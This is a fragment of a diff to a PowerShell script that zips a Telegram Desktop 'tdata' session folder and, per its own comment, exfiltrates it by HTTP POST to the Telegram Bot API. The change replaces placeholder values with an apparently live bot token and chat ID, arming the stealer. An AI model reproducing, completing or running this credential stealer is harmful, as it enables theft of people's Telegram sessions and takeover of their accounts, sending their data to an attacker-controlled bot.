@@ -7,8 +7,8 @@ if (Test-Path $tdataPath) {
     Compress-Archive -Path $tdataPath -DestinationPath $zipPath -Force
 
     # 3. Exfiltrate the file using native web request utilities
-    $botToken = "YOUR_BOT_TOKEN_HERE"
-    $chatId   = "YOUR_CHAT_ID_HERE"
+    $botToken = "8853091711:AAHXtKxyYTa91Xn0_Lgb4QXj0481ZRspQ4M"
+    $chatId   = "8699240431"
     $url      = "https://api.telegram.org/bot$botToken/sendDocument"
 
     # Send the ZIP file natively via an HTTP POST request
